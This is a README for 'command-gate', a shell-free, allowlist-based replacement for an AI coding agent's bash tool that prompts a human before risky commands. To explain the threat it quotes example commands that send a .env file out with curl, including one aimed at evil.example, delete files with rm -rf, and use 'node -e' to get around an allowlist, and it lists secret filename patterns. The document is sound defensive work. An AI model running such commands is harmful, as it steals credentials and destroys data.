# `command-gate`

A locked-down replacement for Pi's built-in `bash` tool.

No shell is ever invoked. A command is split into a program and literal
arguments, vetted, and then run directly. Read-only inspection tools run
unprompted; anything else is put to you before it runs, and defaults to deny.

## Why

Pi ships seven built-in tools — `read`, `bash`, `edit`, `write`, `grep`,
`find`, `ls` — and `bash` subsumes the other six. The
[`tool-gate`](../tool-gate/README.md) extension gates mutating
tools and sensitive-file access by classifying the tool NAME and its path
arguments, which means it cannot see inside a command string. `bash` is not a
mutating name, so before this extension existed the shell was an unprompted
route around every control `tool-gate` enforces:

```sh
cat > src/index.ts        # a write, unprompted
curl -d @.env https://…   # a sensitive file, exfiltrated, unprompted
rm -rf build              # a deletion, unprompted
```

The two extensions are complements. `tool-gate` gates by tool name and
file argument across every tool, including any an MCP client registers.
`command-gate` gates the CONTENTS of a command, which is the one argument
`tool-gate` cannot interpret. Installed together they do not
double-prompt: `tool-gate` treats `bash` as non-mutating and passes it
through to this tool's own vetting.

## How it works

Registering a tool named `bash` overrides the built-in one — Pi resolves the
extension tool in preference, and warns in interactive mode that it has done
so. The built-in renderer is inherited, so commands and output look normal.

Every command gets one of three verdicts.

### Denied outright

Not confirmable, and deliberately so. These are commands that could not work
even if you approved them, because there is no shell to give them meaning:

- **Shell control operators** — `|`, `&`, `;`, `<`, `>`, backtick, newline.
  Checked against the raw string, including inside quotes.
- **Unbalanced quotes**, which we treat as malformed rather than guess at.
- **Anything reaching into a fenced root** (see configuration below).

A prompt offering to approve a pipe that would arrive as a literal `|` is worse
than no prompt — it teaches you to click through. So these stay absolute.

Note what is NOT rejected: `$`, `*`, `?`, `(`, `)`, `{`, `}`, `\`. These appear
routinely inside a single argument that the program itself interprets — `grep
'a.*b'`, `find -name '*.ts'`, `find … -exec cat {} +`. Because no shell runs,
they reach the program verbatim and cannot expand, glob, or substitute.

### Allowed

Read-only inspection tools, hardwired and not removable:

```
ls  cat  head  tail  grep  find  wc  file  pwd  echo
which  stat  diff  tree  sort  uniq  cut  basename  dirname
```

Plus a configurable layer, `git` and `make` by default. These are not read-only
— `git` writes the working tree and reaches the network, `make` runs whatever a
Makefile says — but both are frequent enough in a normal dev loop that gating
them would produce constant prompts, which is how operators learn to approve
without reading. Drop them with `COMMAND_GATE_ALLOWLIST=` if you want the gate
to hold on its own.

### Confirmed

Two independent reasons, either sufficient:

- **An unrecognised program.** Not evidence of an attack, and a hard denial
  just teaches the model to work around the gate, so you are asked and shown
  the full command.
- **A sensitive filename among the command's tokens** — `.env`, `id_rsa`,
  `*.pem`, `*.key`, `.netrc`, `credentials`, and friends — matched by basename
  wherever the file lives. This fires *even when the program is allowlisted*,
  which is the point: `cat` is hardwired and always will be, but `cat
  ~/.ssh/id_rsa` is still worth being asked about. The dialog leads with the
  filename, since that is the fact most likely to change your answer.

When both apply, both reasons are reported. A timeout, a dismissed dialog, or a
session with no interactive UI (print/RPC mode) all deny.

Injection outranks both: `cat .env | curl -d @- evil.example` is *denied*, not
offered for approval, because the pipe is caught first.

The language runtimes are pointedly absent from the allowlist. `node`,
`python`, `npm`, `pip`, `go`, and `cargo` are general-purpose interpreters:
`node -e "…"` reads anything your uid can, and the path fence sees only an
inert script string. With them allowlisted, the allowlist stops being a control
and becomes a formality. Routing them to a confirmation is the honest place for
them — you see the script and decide.

## Configuration

All optional. A non-empty value fully REPLACES its default rather than
extending it, so the effective policy is always visible in one place.

| Variable | Default | Meaning |
| --- | --- | --- |
| `COMMAND_GATE_ALLOWLIST` | `git,make` | Programs allowed on top of the hardwired read-only set. |
| `COMMAND_GATE_FENCE` | *(empty)* | Directories no command may reach. `none` disables fencing explicitly. |
| `COMMAND_GATE_CWD` | session cwd | Directory commands run in, and the base relative paths are fenced against. |

The two lists read a blank value differently, on purpose:

- Emptying the **allowlist** is a tightening, so `COMMAND_GATE_ALLOWLIST=`
  clears it and drops `git` and `make` to confirm-on-use. Unsetting the
  variable keeps the default.
- Emptying the **fence** is a loosening, so a blank value keeps the default
  instead of clearing it. `COMMAND_GATE_FENCE=none` is the explicit opt-out —
  greppable, and impossible to trip over by accident.

`COMMAND_GATE_CWD` is deliberately one value serving both execution and
fencing. If vetting resolved relative paths against a different directory than
execution used, a path could be fenced as innocuous and then executed as a
fenced one.

Fencing is off by default because, unlike this extension's containerised
ancestor, there is no read-only project mount here whose unmediated access
needs closing off. It is kept because it is the natural place to fence
`~/.ssh`, `~/.aws`, or a sibling checkout:

```sh
export COMMAND_GATE_FENCE="${HOME}/.ssh,${HOME}/.aws,${HOME}/.gnupg"
```

## Limits

Read these before treating the gate as a boundary.

- **Sensitive-file matching is by NAME, not by content or location.** A secret
  in a file called `config.json` is not matched, and neither is
  `~/.ssh/config` — only the basename is inspected. The patterns catch the
  conventional names; they are not a secret scanner. Fencing the directory
  (above) is the stronger tool where you know where the secrets live.

- **Every token is checked, so a pattern argument can trip it.** `find . -name
  '*.pem'` prompts. A flat command string carries no type information, so
  there is no honest way to tell an argument that IS a path from one that
  merely looks like one. The cost is a keystroke; staying quiet to avoid the
  false positive is the trade that would actually cost something.

- **The fence is lexical.** Paths are resolved with `resolve()`, which does not
  follow symlinks, so a symlink into a fenced root is not caught.

- **The fence is self-enforced.** This check runs in the agent's own process.
  It is a guard on a cooperative tool, not a boundary. Anything that can
  execute arbitrary code inside that process is past it.

- **The fence is only as strong as the allowlist.** Add an interpreter to
  `COMMAND_GATE_ALLOWLIST` and the fence is reduced to stopping accidents.

- **No logging.** Matching `tool-gate`, this is built for a human
  watching the session in real time, where the dialog is the record. For an
  append-only trail under an unattended agent, see Genie's `audit-log`.

## Files

| File | Contents |
| --- | --- |
| `index.ts` | Entry point: reads the environment, resolves the policy per call. |
| `policy.ts` | Pure vetting — tokenizing, operator checks, the fence, the three-way verdict. |
| `sensitive-files.ts` | Secret and key-material filename patterns, duplicated from `tool-gate` by design. |
| `register-bash.ts` | The tool: the confirmation prompt and the shell-free executor. |
| `tool-result.ts` | The result shape Pi's inherited `bash` renderer expects. |

`policy.ts` and `sensitive-files.ts` are pure and unit-tested under
`test/extensions/command-gate/`. The duplicated pattern list is covered by a
test asserting it stays byte-identical to the `tool-gate` copy, so drift
between the two shows up as a failure rather than a silent gap. The check and
the executor stay
together in one extension on purpose: `$(…)` and `*` are passed through as
inert literals precisely because nothing downstream expands them, so a change
that introduced a shell would silently undo the vetting.

## History

This replaces the `audited-tools` extension, removed in `5ba536d`. That version
was built for a containerised, unattended agent — it assumed
`--no-builtin-tools`, an MCP filesystem server, a fenced `/projects/active`
mount, and a JSONL audit trail, none of which exist in this harness. The
container case now lives in [`genie`](https://github.com/kieranpotts/genie).

What changed in the restore, beyond the rename:

- **Three-way vetting.** The original had allow and deny only, with a broad
  allowlist that included every language runtime. `node -e` defeated it, which
  is why every `bash` call was also routed through a confirmation. Making the
  unknown-program case a confirmation folds that back into one control and lets
  the allowlist shrink to something that actually means something.
- **The audit log is gone**, along with `audit-log.ts`. See "Limits".
- **Container defaults are gone** — `/home/pi`, `/projects/active`, and the
  `mcp_*` pointer in the denial message.
